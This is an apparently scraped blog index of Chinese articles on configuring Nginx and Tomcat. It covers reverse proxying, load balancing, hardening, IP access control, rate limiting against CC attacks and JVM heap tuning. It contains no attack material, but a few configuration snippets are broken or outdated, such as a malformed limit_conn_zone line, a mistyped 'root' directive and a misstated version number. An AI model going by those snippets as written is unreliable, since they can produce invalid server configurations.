$host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;proxy_pass http://127.0.0.1:8080;&#125;#所有静态文件由nginx直接读取不经过tomcat或resinlocation ~ .*.(htm|html|gif|jpg|jpeg|png|bmp|swf|ioc|rar|zip|txt|flv|mid|doc|ppt|pdf|xls|mp3|wma)$&#123; expires 15d; &#125;location ~ .*.(js|css)?$&#123; expires 1h; &#125;&#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112user www www;worker_processes 2;error_log logs/error.log;#error_log logs/error.log notice;#error_log logs/error.log info;pid logs/nginx.pid;events &#123; use epoll; worker_connections 65535;&#125;http &#123; include mime.types; default_type application/octet-stream; include /usr/local/nginx/conf/proxy.conf; #log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' # '$status $body_bytes_sent \"$http_referer\" ' # '\"$http_user_agent\" \"$http_x_forwarded_for\"'; #access_log logs/access.log main; sendfile on; # tcp_nopush on; keepalive_timeout 65; # gzip压缩功能设置 gzip on; gzip_min_length 1k; gzip_buffers 4 16k; gzip_http_version 1.0; gzip_comp_level 6; gzip_types text/html text/plain text/css text/javascript application/json application/javascript application/x-javascript application/xml; gzip_vary on; # http_proxy 设置 client_max_body_size 10m; client_body_buffer_size 128k; proxy_connect_timeout 75; proxy_send_timeout 75; proxy_read_timeout 75; proxy_buffer_size 4k; proxy_buffers 4 32k; proxy_busy_buffers_size 64k; proxy_temp_file_write_size 64k; proxy_temp_path /usr/local/nginx/proxy_temp 1 2; # 设定负载均衡后台服务器列表 upstream backend &#123; #ip_hash; server 192.168.10.100:8080 max_fails=2 fail_timeout=30s ; server 192.168.10.101:8080 max_fails=2 fail_timeout=30s ; &#125; # 很重要的虚拟主机配置 server &#123; listen 80; server_name itoatest.example.com; root /apps/oaapp; charset utf-8; access_log logs/host.access.log main; #对 / 所有做负载均衡+反向代理 location / &#123; root /apps/oaapp; index index.jsp index.html index.htm; proxy_pass http://backend; proxy_redirect off; # 后端的Web服务器可以通过X-Forwarded-For获取用户真实IP proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504; &#125; #静态文件，nginx自己处理，不去backend请求tomcat location ~* /download/ &#123; root /apps/oa/fs; &#125; location ~ .*\\.(gif|jpg|jpeg|bmp|png|ico|txt|js|css)$ &#123; root /apps/oaapp; expires 7d; &#125; location /nginx_status &#123; stub_status on; access_log off; allow 192.168.10.0/24; deny all; &#125; location ~ ^/(WEB-INF)/ &#123; deny all; &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; &#125;","link":"/2016/03/29/Web服务技术/Nginx/Nginx基础篇-Nginx.conf配置文件详解/"},{"title":"Nginx+Tomcat实现反向代理优化与配置","text":"Nginx+Tomcat实现反向代理什么是反向代理反向代理（Reverse Proxy）方式是指用代理服务器来接受 internet 上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给 internet 上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。 举个例子，一个用户访问 http://www.example.com/readme，但是 www.example.com 上并不存在 readme 页面，它是偷偷从另外一台服务器上取回来，然后作为自己的内容返回给用户。但是用户并不知情这个过程。对用户来说，就像是直接从 www.example.com 获取 readme 页面一样。这里所提到的 www.example.com 这个域名对应的服务器就设置了反向代理功能。 反向代理服务器，对于客户端而言它就像是原始服务器，并且客户端不需要进行任何特别的设置。客户端向反向代理的命名空间(name-space)中的内容发送普通请求，接着反向代理将判断向何处(原始服务器)转交请求，并将获得的内容返回给客户端，就像这些内容原本就是它自己的一样。如下图所示： 反向代理典型应用场景反向代理的典型用途是将防火墙后面的服务器提供给 Internet 用户访问，加强安全防护。反向代理还可以为后端的多台服务器提供负载均衡，或为后端较慢的服务器提供 缓冲 服务。另外，反向代理还可以启用高级 URL 策略和管理技术，从而使处于不同 web 服务器系统的 web 页面同时存在于同一个 URL 空间下。 Nginx 的其中一个用途是做 HTTP 反向代理，下面简单介绍 Nginx 作为反向代理服务器的方法。 场景描述：访问本地服务器上的 README.md 文件 http://localhost/README.md，本地服务器进行反向代理，从 https://github.com/moonbingbing/openresty-best-practices/blob/master/README.md 获取页面内容。 nginx.conf 配置示例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647worker_processes 1;pid logs/nginx.pid;error_log logs/error.log warn;events &#123; worker_connections 3000;&#125;http &#123; include mime.types; server_tokens off; ## 下面配置反向代理的参数 server &#123; listen 80; ## 1. 用户访问 http://ip:port，则反向代理到 https://github.com location / &#123; proxy_pass https://github.com; proxy_redirect off; ##proxy_redirect 其作用是对发送给客户端的 URL 进行修改。 proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; ##后端的 Web 服务器可以通过 X-Forwarded-For 获取用户真实 IP &#125;#以下是一些反向代理的配置,可选。 proxy_set_header Host $host; 注意: “proxy_set_header”当我们的 RS 有多个虚拟主机(相同的 ip,相同的端口)的 时候如 www、bbs、blog,代理服务器怎么知道将请求发到哪呢,这个时候 nginx 代 理就会查找 proxy_set_header 参数,将请求发送到相应域名的虚拟主机上。client_max_body_size 10m; #允许客户端请求的最大单文件字节数 client_body_buffer_size 128k; #缓冲区代理缓冲用户端请求的最大字节数, proxy_connect_timeout 90; #nginx 跟后端服务器连接超时时间(代理连接超时)proxy_send_timeout 90; #后端服务器数据回传时间(代理发送超时) proxy_read_timeout 90; #连接成功后,后端服务器响应时间(代理接收超时) proxy_buffer_size 4k; #设置代理服务器(nginx)保存用户头信息的缓冲区大小 proxy_buffers 4 32k; #proxy_buffers 缓冲区,网页平均在 32k 以下的设置 proxy_busy_buffers_size 64k; #高负荷下缓冲大小(proxy_buffers*2) proxy_temp_file_write_size 64k; ## 2.用户访问 http://ip:port/README.md，则反向代理到 ## https://github.com/.../README.md location /README.md &#123; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass https://github.com/moonbingbing/openresty-best-practices/blob/master/README.md; &#125; &#125;&#125; 成功启动 nginx 后，我们打开浏览器，验证下反向代理的效果。在浏览器地址栏中输入 localhost/README.md，返回的结果是我们 github 源代码. 我们只需要配置一下 nginx.conf 文件，不用写任何 web 页面，就可以偷偷地从别的服务器上读取一个页面返回给用户。 下面我们来看一下 nginx.conf 里用到的配置项： （1）location location 项对请求 URI 进行匹配，location 后面配置了匹配规则。例如上面的例子中，如果请求的 URI 是 localhost/，则会匹配 location / 这一项；如果请求的 URI 是 localhost/README.md，则会匹配 location /README.md 这项。 上面这个例子只是针对一个确定的 URI 做了反向代理，有的读者会有疑惑：如果对每个页面都进行这样的配置，那将会大量重复，能否做 批量 配置呢？此时需要配合使用 location 的正则匹配功能。具体实现方法可参考本书的 URL 匹配章节。 （2）proxy_pass proxy_pass 后面跟着一个 URL，用来将请求反向代理到 URL 参数指定的服务器上。例如我们上面例子中的 proxy_pass https://github.com，则将匹配的请求反向代理到 https://github.com。 （3）proxy_set_header 默认情况下，反向代理不会转发原始请求中的 Host 头部，如果需要转发，就需要加上这句：proxy_set_header Host $host; 除了上面提到的常用配置项，还有 proxy_redirect、proxy_set_body、proxy_limit_rate 等参数，具体用法可以到Nginx 官网查看。 缓存指令依赖代理缓冲区(buffers),如果 proxy_buffers 设置为 off,缓存不会生效。 正向代理既然有反向代理，自然也有正向代理。简单来说，正向代理就像一个跳板，例如一个用户访问不了某网站（例如 www.google.com），但是他能访问一个代理服务器，这个代理服务器能访问 www.google.com，于是用户可以先连上代理服务器，告诉它需要访问的内容，代理服务器去取回来返回给用户。例如一些常见的翻墙工具、游戏代理就是利用正向代理的原理工作的，我们需要在这些正向代理工具上配置服务器的 IP 地址等信息。","link":"/2016/03/26/Web服务技术/Nginx/Nginx+Tomcat实现反向代理优化与配置 /"},{"title":"Nginx 安全&优化&日志输出规范详细配置","text":"##1.Nginx日志审计 ① 参考配置操作(1)编辑 nginx.conf 配置文件 将 error_log 前的“#”去掉，记录错误日志将 access_log 前的“#”去掉，记录访问日志(2)设置 access_log，修改配置文件如下： 1234log_format formatname '$remote_addr - $remote_user [$time_local] '' \"$request\" $status $body_bytes_sent \"$http_referer\" '' \"$http_user_agent\" \"$http_x_forwarded_for\"'; access_loglogs/access.log formantname; #formatname 是设置配置文件格式的名称 ② 备注事项查看 nginx.conf 配置文件中，error_log、access_log 前的“#”是否去掉0x02 服务1 限制 IP 访问对网站或敏感目录的访问 IP 进行限制① 参考配置操作(1)修改配置文件 vi /usr/local/nginx/conf/nginx.conf 具体设置如下： 12345location / &#123;deny 192.168.1.1; #拒绝 IPallow 192.168.1.0/24; #允许 IPallow 10.1.1.0/16; #允许 IPdeny all; #拒绝其他所有 IP (2)重新启动 nginx 服务 ② 备注事项根据应用场景，设置合适的 IP 地址，检查配置文件 #more /usr/local/nginx/conf/nginx.conf中的 2.控制超时时间控制超时时间，提高服务器性能，降低客户端的等待时间 ① 建议配置(1)修改配置文件 vim /usr/local/nginx/conf/nginx.conf 具体设置如下： 1234567891011121314151617181920212223242526272829303132client_body_timeout 10; #设置客户端请求主体读取超时时间client_header_timeout 10; #设置客户端请求头读取超时时间keepalive_timeout 5 5; #第一个参数指定客户端连接保持活动的超时时间，第二个参数是可选的，它指定了消息头保持活动的有效时间send_timeout 10; #指定响应客户端的超时时间(2)重新启动 nginx 服务② 备注事项需要根据应用场景的需要选择合适的参数值。1 、符合性判定依据超时后，服务器返回相应的消息。2 、参考检测方法检查配置文件 #more /usr/local/nginx/conf/nginx.conf3 下载限制并发和速度限制客户端下载速度，保证服务器负载正常① 建议配置例如网站存放路径为/usr/local/nsfocus/ ，服务器名称为：down.nsfocus.com(1)修改配置文件#vi /usr/local/nginx/conf/nginx.conf具体设置如下：limit_zone one $binary_remote_addr 10m;server&#123;listen 80;server_name down.nsfocus.com;index index.html index.htm index.PHP;oot /usr/local/nsfocus;#Zone limit;location / &#123;limit_conn one 1;limit_rate 20k;&#125;.....&#125; (2)重新启动 nginx 服务 下载时，不会超过设计的并发连接数和速度限制，同时检查 nginx.conf 文件中的配置 其他事项 3.卸载不需要的模块卸载不需要的 nginx 模块, 最大限度地将 nginx 加载的模块最小化 ① 建议配置(1)检查需要禁用的模块 在编译 nginx 服务器时，使用下面的命令查看哪些模块应该启用，哪些模应该禁用： # ./configure --help | less 一旦处选了要禁用的模块，需要与相关人员沟通确认，并经过测试不影响业务运行。 (2)例如，要禁用 autoindex 和 SSI 模块，命令如下： 123# ./configure --without-http_autoindex_module --without-http_ssi_module# make# make install ② 备注事项Nginx 不包含不必要的模块或者输入 ./configure –help | less 进行检查 ##4.防盗链设置防止其他网站盗链本网站资源 ① 建议配置(1)修改配置文件 #vi /usr/local/nginx/conf/nginx.conf 具体设置如下： 12345678location ~* ^.+\\.(gif|jpg|png|swf|flv|rar|zip)$ &#123;valid_referers none blocked server_names *.nsfocus.comhttp://localhost baidu.com;if ($invalid_referer) &#123;rewrite ^/ [img]http://www.ihaozhuo.com/images/default/logo.gif[/img];# return 403;&#125;&#125; 根据应用场景，设置合适的域名(2)Nginx -t 检查配置是否有没有问题。 重新启动 nginx 服务 ② 备注事项从非法网站访问所保护的资源，出现设置的页面。同时检查配置文件 #more /usr/local/nginx/conf/nginx.conf ##5.自定义错误信息1)修改 src/http/ngx_http_special_response.c，自己定制错误信息 123456789101112## messages with just a carriage return.static char ngx_http_error_400_page[] = CRLF;static char ngx_http_error_404_page[] = CRLF;static char ngx_http_error_413_page[] = CRLF;static char ngx_http_error_502_page[] = CRLF;static char ngx_http_error_504_page[] = CRLF;常见错误：400 bad request404 NOT FOUND413 Request Entity Too Large502 Bad Gateway504 Gateway Time-out (2)重新启动 nginx 服务 ② 备注事项URL 地址栏中输入 http://ip:8800/manager12345，访问出错时，返回自定义的错误页面 6.隐藏 nginx 服务信息头① 建议配置修改 nginx解压路径/src/http/ngx_http_header_filter_module.c文件的第48和 49 行内容，自定义头信息： 12static char ngx_http_server_string[] = “Server:XXXXX.com” CRLF;static char ngx_http_server_full_string[] = “Server:XXXXX.com” CRLF; 添加如下代码到 nginx.conf配置文件，禁止错误页面中显示 nginx 版本号： 1server_tokens off ② 备注事项服务信息头显示设置的内容，检查 http 服务信息头内容 6.补丁更新安装系统补丁，修补漏洞 1.参考配置操作手动安装补丁或安装最新版本软件，所安装的补丁，应首先在经过测试验证；安装前，要做好数据备份。2.查看版本和编译器信息","link":"/2016/04/05/Web服务技术/Nginx/Nginx 安全&优化&日志输出规范详细配置/"},{"title":"Nginx限制IP访问权限或限制某个IP同一时间段的访问次数","text":"nginx限制ip访问 nginx访问权限看下配置： 这里我只允许我公司IP访问： 12345678910111213141516 server &#123; listen 80; server_name kibana.ihaozhuo.com; location / &#123; index index.html index.php index.jsp index.htm; allow 202.107.202.82/32; deny all; proxy_pass http://kibana.ihaozhuo.com; proxy_ignore_client_abort on; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125;&#125; 这里分全局配置和站点配置。这里我kibana网站只限制当个网站IP访问： 一、服务器全局限IP 123#vi nginx.conf allow 202.107.202.82/32; #允许的IP deny all; 二、站点限IP 123456#vi vhosts.conf站点全局限IP:location / &#123; index index.html index.htm index.php; allow 202.107.202.82/32; deny all; 如何设置能限制某个IP某一时间段的访问次数如何设置能限制某个IP某一时间段的访问次数是一个让人头疼的问题，特别面对恶意的ddos攻击的时候。其中CC攻击（Challenge Collapsar）是DDOS（分布式拒绝服务）的一种，也是一种常见的网站攻击方法，攻击者通过代理服务器或者肉鸡向向受害主机不停地发大量数据包，造成对方服务器资源耗尽，一直到宕机崩溃。 cc攻击一般就是使用有限的ip数对服务器频繁发送数据来达到攻击的目的，nginx可以通过HttpLimitReqModul和HttpLimitZoneModule配置来限制ip在同一时间段的访问次数来防cc攻击。 HttpLimitReqModul用来限制连单位时间内连接数的模块，使用limit_req_zone和limit_req指令配合使用来达到限制。一旦并发连接超过指定数量，就会返回503错误。 HttpLimitConnModul用来限制单个ip的并发连接数，使用limit_zone和limit_conn指令 这两个模块的区别前一个是对一段时间内的连接数限制，后者是对同一时刻的连接数限制 ####HttpLimitReqModul 限制某一段时间内同一ip访问数实例 123456789101112131415161718192021222324252627282930http&#123; ... #定义一个名为allips的limit_req_zone用来存储session，大小是10M内存， #以$binary_remote_addr 为key,限制平均每秒的请求为20个， #1M能存储16000个状态，rete的值必须为整数， #如果限制两秒钟一个请求，可以设置成30r/m limit_req_zone $binary_remote_addr zone=allips:10m rate=20r/s; ... server&#123; ... location &#123; ... #限制每ip每秒不超过20个请求，漏桶数burst为5 #brust的意思就是，如果第1秒、2,3,4秒请求为19个， #第5秒的请求为25个是被允许的。 #但是如果你第1秒就25个请求，第2秒超过20的请求返回503错误。 #nodelay，如果不设置该选项，严格使用平均速率限制请求数， #第1秒25个请求时，5个请求放到第2秒执行， #设置nodelay，25个请求将在第1秒执行。 limit_req zone=allips burst=5 nodelay; ... &#125; ... &#125; ...&#125; HttpLimitZoneModule 限制并发连接数实例limit_zone只能定义在http作用域，limit_conn可以定义在http server location作用域 123456789101112131415161718192021222324http&#123; ... #定义一个名为one的limit_zone,大小10M内存来存储session， #以$binary_remote_addr 为key #nginx 1.18以后用limit_conn_zone替换了limit_conn #且只能放在http作用域 limit_conn_zone one $binary_remote_addr 10m; ... server&#123; ... location &#123; ... limit_conn one 20; #连接数限制 #带宽限制,对单个连接限数，如果一个ip两个连接，就是500x2k limit_rate 500k; ... &#125; ... &#125; ...&#125; nginx白名单设置以上配置会对所有的ip都进行限制，有些时候我们不希望对搜索引擎的蜘蛛或者自己测试ip进行限制，对于特定的白名单ip我们可以借助geo指令实现。1. 123456789101112131415161718192021222324252627282930313233http&#123; geo $limited&#123; default 1; #google 64.233.160.0/19 0; 65.52.0.0/14 0; 66.102.0.0/20 0; 66.249.64.0/19 0; 72.14.192.0/18 0; 74.125.0.0/16 0; 209.85.128.0/17 0; 216.239.32.0/19 0; #M$ 64.4.0.0/18 0; 157.60.0.0/16 0; 157.54.0.0/15 0; 157.56.0.0/14 0; 207.46.0.0/16 0; 207.68.192.0/20 0; 207.68.128.0/18 0; #yahoo 8.12.144.0/24 0; 66.196.64.0/18 0; 66.228.160.0/19 0; 67.195.0.0/16 0; 74.6.0.0/16 0; 68.142.192.0/18 0; 72.30.0.0/16 0; 209.191.64.0/18 0; #My IPs 127.0.0.1/32 0; 123.456.0.0/28 0; #example for your server CIDR &#125; geo指令定义了一个白名单$limited变量，默认值为1，如果客户端ip在上面的范围内，$limited的值为0 2.使用map指令映射搜索引擎客户端的ip为空串，如果不是搜索引擎就显示本身真是的ip，这样搜索引擎ip就不能存到limit_req_zone内存session中，所以不会限制搜索引擎的ip访问 map $limited $limit {1 $binary_remote_addr;0 “”;} 3.设置limit_req_zone和limit_reqlimit_req_zone $limit zone=foo:1m rate=10r/m; limit_req zone=foo burst=5; 最后我们使用ab压php-fpm的方式，对上面的方法效果实际测试下 例1：限制只允许一分钟内只允许一个ip访问60次配置，也就是平均每秒1次首先我们准备一个php脚本放在根目录下$document_root test.php 123for( $i=0; $i &lt; 1000; $i++)echo 'Hello World';?&gt; nginx配置增加limit_req_zone 和 limit_req 123456789101112131415http&#123; ... limit_req_zone $binary_remote_addr zone=allips:10m rate=60r/m; ... server&#123; ... location &#123; ... limit_req zone=allips; ... &#125; ... &#125; ...&#125; ab -n 5 -c 1 http://www.weizhang.org/test.php 12345118.144.94.193 - - [22/Dec/2012:06:27:06 +0000] \"GET /test.php HTTP/1.0\" 200 11000 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:06:27:06 +0000] \"GET /test.php HTTP/1.0\" 503 537 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:06:27:07 +0000] \"GET /test.php HTTP/1.0\" 503 537 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:06:27:07 +0000] \"GET /test.php HTTP/1.0\" 503 537 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:06:27:07 +0000] \"GET /test.php HTTP/1.0\" 503 537 \"-\" \"ApacheBench/2.3\" 未设置brust和nodelay可以看到该配置只允许每秒访问1次，超出的请求返回503错误 123456789101112131415http&#123; ... limit_req_zone $binary_remote_addr zone=allips:10m rate=60r/m; ... server&#123; ... location &#123; ... limit_req zone=allips burst=1 nodelay; ... &#125; ... &#125; ...&#125; ab -n 5 -c 1 http://www.weizhang.org/test.php 12345118.144.94.193 - - [22/Dec/2012:07:01:00 +0000] \"GET /test.php HTTP/1.0\" 200 11000 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:07:01:00 +0000] \"GET /test.php HTTP/1.0\" 200 11000 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:07:01:01 +0000] \"GET /test.php HTTP/1.0\" 503 537 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:07:01:01 +0000] \"GET /test.php HTTP/1.0\" 503 537 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:07:01:01 +0000] \"GET /test.php HTTP/1.0\" 503 537 \"-\" \"ApacheBench/2.3\" 设置brust=1和nodelay后允许第1秒处理两个请求。 参考例子：http://storysky.blog.51cto.com/628458/642970/","link":"/2016/02/25/Web服务技术/Nginx/Nginx限制IP访问权限或限制某个IP同一时间段的访问次数/"},{"title":"tomcat Java heap space 内存溢出","text":"tomcat Java heap space 内存溢出confluence服务器早上BI那边反应访问wiki出现504 Gateway time-out 之前定位到问题是服务器CPU负载过高 之前服务器配置1核1G的配置 导致用户请求超时，后面服务器升级到2核4G内存，默认wiki没有内存优化，导致这次访问出现内存溢出的报错。 内存溢出日志报错： 12345678910111213141516171819202017-08-18 16:30:07,181 INFO [main] [com.atlassian.confluence.lifecycle] contextInitialized Starting Confluence 3.4.5 (build #2035)2017-08-18 16:30:10,297 INFO [main] [atlassian.plugin.manager.DefaultPluginManager] init Initialising the plugin system2017-08-18 16:30:10,519 INFO [main] [atlassian.plugin.manager.DefaultPluginManager] init Plugin system started in 0:00:00.219Aug 18, 2017 4:30:51 PM org.apache.coyote.http11.Http11Protocol startINFO: Starting Coyote HTTP/1.1 on http-8080Aug 18, 2017 4:30:51 PM org.apache.catalina.startup.Catalina startINFO: Server startup in 48320 msException: java.lang.OutOfMemoryError thrown from the UncaughtExceptionHandler in thread \"Timer-0\"Exception in thread \"DefaultQuartzScheduler_QuartzSchedulerThread\" java.lang.OutOfMemoryError: Java heap spaceException in thread \"com.mchange.v2.async.ThreadPoolAsynchronousRunner$PoolThread-#2\" java.lang.OutOfMemoryError: Java heap spaceException: java.lang.OutOfMemoryError thrown from the UncaughtExceptionHandler in thread \"ContainerBackgroundProcessor[StandardEngine[Standalone]]\"Exception: java.lang.OutOfMemoryError thrown from the UncaughtExceptionHandler in thread \"com.mchange.v2.async.ThreadPoolAsynchronousRunner$PoolThread-#1\"Exception in thread \"com.mchange.v2.async.ThreadPoolAsynchronousRunner$PoolThread-#0\" java.lang.OutOfMemoryError: Java heap spaceException in thread \"DefaultQuartzScheduler_Worker-1\" java.lang.OutOfMemoryError: Java heap spaceException in thread \"DefaultQuartzScheduler_Worker-3\" java.lang.OutOfMemoryError: Java heap spaceException in thread \"DefaultQuartzScheduler_Worker-2\" java.lang.OutOfMemoryError: Java heap spaceException in thread \"http-8080-2\" java.lang.OutOfMemoryError: Java heap space 第一查看现在Java应用进程运行状态是否优化过，运行的内存大小多少。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051[root@wiki-bi logs]# jmap -heap 4299Attaching to process ID 4299, please wait...Debugger attached successfully.Server compiler detected.JVM version is 23.25-b01using thread-local object allocation.Parallel GC with 4 thread(s)Heap Configuration: MinHeapFreeRatio = 40 MaxHeapFreeRatio = 70 MaxHeapSize = 536870912 (512.0MB) NewSize = 1310720 (1.25MB) MaxNewSize = 17592186044415 MB OldSize = 5439488 (5.1875MB) NewRatio = 2 SurvivorRatio = 8 PermSize = 21757952 (20.75MB) MaxPermSize = 268435456 (256.0MB) G1HeapRegionSize = 0 (0.0MB)Heap Usage:PS Young GenerationEden Space: capacity = 71958528 (68.625MB) used = 71943440 (68.61061096191406MB) free = 15088 (0.0143890380859375MB) 99.97903236708788% usedFrom Space: capacity = 52166656 (49.75MB) used = 0 (0.0MB) free = 52166656 (49.75MB) 0.0% usedTo Space: capacity = 53477376 (51.0MB) used = 0 (0.0MB) free = 53477376 (51.0MB) 0.0% usedPS Old Generation capacity = 357957632 (341.375MB) used = 357957344 (341.3747253417969MB) free = 288 (2.74658203125E-4MB) 99.9999195435509% usedPS Perm Generation capacity = 90898432 (86.6875MB) used = 90605744 (86.40837097167969MB) free = 292688 (0.2791290283203125MB) 99.67800544678262% used43519 interned Strings occupying 4740128 bytes. 这里可以看到MaxHeapSize 等参数默认512MB，这里优化内存配置后 1234vim /data/wiki-bi/bin/setenv.shJAVA_OPTS=\"-Xms2g -Xmx2g -Xss256k -XX:PermSize=256M -XX:MaxPermSize=256m -Duser.timezone=Asia/Shanghai $JAVA_OPTS -Djava.awt.headless=true \"export JAVA_OPTS 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051[root@wiki-bi bin]# jmap -heap 25727Attaching to process ID 25727, please wait...Debugger attached successfully.Server compiler detected.JVM version is 23.25-b01using thread-local object allocation.Parallel GC with 4 thread(s)Heap Configuration: MinHeapFreeRatio = 40 MaxHeapFreeRatio = 70 MaxHeapSize = 2147483648 (2048.0MB) NewSize = 1310720 (1.25MB) MaxNewSize = 17592186044415 MB OldSize = 5439488 (5.1875MB) NewRatio = 2 SurvivorRatio = 8 PermSize = 268435456 (256.0MB) MaxPermSize = 268435456 (256.0MB) G1HeapRegionSize = 0 (0.0MB)Heap Usage:PS Young GenerationEden Space: capacity = 536870912 (512.0MB) used = 448110856 (427.35181427001953MB) free = 88760056 (84.64818572998047MB) 83.46715122461319% usedFrom Space: capacity = 89456640 (85.3125MB) used = 0 (0.0MB) free = 89456640 (85.3125MB) 0.0% usedTo Space: capacity = 89456640 (85.3125MB) used = 0 (0.0MB) free = 89456640 (85.3125MB) 0.0% usedPS Old Generation capacity = 1431699456 (1365.375MB) used = 0 (0.0MB) free = 1431699456 (1365.375MB) 0.0% usedPS Perm Generation capacity = 268435456 (256.0MB) used = 35112728 (33.486106872558594MB) free = 233322728 (222.5138931274414MB) 13.0805104970932% used15180 interned Strings occupying 1629600 bytes.","link":"/2017/08/18/Web服务技术/tomcat/tomcat Java heap space 内存溢出/"},{"title":"Nginx+Tomcat实现负载均衡设置访问控制","text":"Nginx+Tomcat实现负载均衡设置访问控制一、环境准备 Tomcat1：10.11.155.26 Tomcat2：10.11.155.41 Nginx：192.168.31.154 在26和41上分别部署相同的Tomcat程序，修改index.jsp页面，把内容改为各自的IP地址. 二、修改配置文件nginx.confNginx负载均衡，其实主要就是用upstream、server指令，再配以权重等等参数。如果为了让nginx支持session共享，还需要额外增加一个模块。 一、Nginx负载均衡 在http{…}中配置一个upstream{…}，参考如下：引用 upstream tomcat-account { server 10.11.155.26:8080 weight=1; server 10.11.155.41:8080 weight=1; } 接着修改location节点，配置代理： 引用 1234567891011121314151617181920212223242526272829server &#123; listen 80; server_name 10001.test.intranet; location / &#123; index index.html index.php index.jsp index.htm; proxy_pass http://tomcat-account; proxy_ignore_client_abort on; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125;``` 这里可以写自己的内网域名也可以写IP.当访问根路径时，会轮播路由到两台服务器上，至于后端服务器是tomcat还是jetty之类的，都无所谓，照葫芦画瓢就是了。当然，有的机器性能好，或者负载低，可以承担高负荷访问量，可以通过权重（weight），提升访问频率。数值越高，被分配到的请求数越多。#### 1、weight（权重）指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。如下所示，10.0.0.88的访问比率要比10.0.0.77的访问比率高一倍。```bashupstream linuxidc&#123; server 10.11.155.26 weight=5; server 10.11.155.41 weight=10; &#125; 2、ip_hash（访问ip）每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。 12345upstream favresin&#123; ip_hash; server 10.11.155.26:8080; server 10.11.155.41:8080; &#125; 3、fair（第三方）按后端服务器的响应时间来分配请求，响应时间短的优先分配。与weight分配策略类似。 12345upstream favresin&#123; server 10.11.155.26:8080; server 10.11.155.41:8080; fair; &#125; server指令参数如下： 12345- weight ——权重，数值越大，分得的请求数就越多，默认值为1。- max_fails ——对访问失败的后端服务器尝试访问的次数。默认值为1，当设置为0时将关闭检查。- fail_timeout——失效超时时间，当多次访问失败后，对该节点暂停访问。- down——标记服务器为永久离线状态，用于ip_hash指令。- backup——仅当非backup服务器全部宕机或繁忙时启用。 例如，可以这样配置： 引用 upstream tomcat { server 10.11.155.26:8080 weight=5; server 10.11.155.41:8080 weight=10; } 后者分得的请求数就会较高。 详细点的负载均衡配置nginx.conf:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133user www;worker_processes 1;#error_log logs/error.log;#error_log logs/error.log notice;#error_log logs/error.log info;error_log /opt/logs/nginx/error.log crit;# pid /usr/local/nginx/nginx.pid;pid /var/run/nginx.pid;worker_rlimit_nofile 1024;events &#123; use epoll; worker_connections 65535;&#125;#设定http服务器，利用它的反向代理功能提供负载均衡支持http &#123; #设定mime类型,类型由mime.type文件定义 include /etc/nginx/mime.types; default_type application/octet-stream; #access_log logs/access.log main; server_names_hash_bucket_size 128; client_header_buffer_size 32k; large_client_header_buffers 4 32k; sendfile on; tcp_nopush on; tcp_nodelay on; #keepalive_timeout 0; keepalive_timeout 65; #gzip on; log_format access '$remote_addr - $remote_user [$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; #设定日志格式 access_log /var/log/nginx/access.log; server &#123; listen 80; server_name localhost; location / &#123; root html; index index.html index.htm; limit_req zone=one; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; &#125; #省略上文有的一些配置节点 #。。。。。。。。。。 #设定负载均衡的服务器列表 upstream tomcat-account &#123; #weigth参数表示权值，权值越高被分配到的几率越大 server 192.168.8.1x:3128 weight=5; #本机上的Squid开启3128端口,不是必须要squid server 192.168.8.2x:80 weight=1; server 192.168.8.3x:80 weight=6; &#125; upstream mysvr2 &#123; #weigth参数表示权值，权值越高被分配到的几率越大 server 192.168.8.x:80 weight=1; server 192.168.8.x:80 weight=6; &#125; #第一个虚拟服务器 server &#123; #侦听192.168.8.x的80端口 listen 80; server_name 192.168.8.x; #对aspx后缀的进行负载均衡请求 location ~ .*.aspx$ &#123; #定义服务器的默认网站根目录位置 root /root; #定义首页索引文件的名称 index index.php index.html index.htm; #请求转向mysvr 定义的服务器列表 proxy_pass http://tomcat-account; #以下是一些反向代理的配置可删除.所以可以按nginx+tomcat 做负载均衡即可。 proxy_redirect off; #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; 